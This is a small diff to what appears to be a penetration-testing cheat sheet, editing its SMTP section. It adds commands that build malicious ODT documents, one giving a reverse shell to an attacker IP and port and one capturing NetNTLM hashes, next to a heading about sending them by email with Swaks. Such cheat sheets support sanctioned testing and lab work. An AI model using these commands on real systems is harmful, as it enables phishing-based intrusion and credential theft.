@@ -132,8 +132,10 @@ impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
 ```
 ### SMTP
 ```bash
-# Crafting a malicious ODT file
+# Crafting a malicious ODT file reverse shell
 python3 mmg-ods.py windows <ATTACKPORT> <ATTACKIP>
+
+# Crafting a malicious ODT file to obtain NetNTLM Hash
 python3 badodt.py
 
 # Sending emails using Swaks
